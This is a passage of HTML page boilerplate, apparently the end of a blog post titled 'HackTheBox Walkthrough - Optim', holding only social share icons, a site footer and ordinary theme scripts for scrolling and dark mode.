0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f&title=HackTheBox%20Walkthrough%20-%20Optim"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Walkthrough%20-%20Optim%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Walkthrough%20-%20Optim&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Optim on ycombinator" href="https://news.ycombinator.com/submitlink?t=HackTheBox%20Walkthrough%20-%20Optim&u=http%3a%2f%2flocalhost%3a1313%2fposts%2foptim%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>x64.moe</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>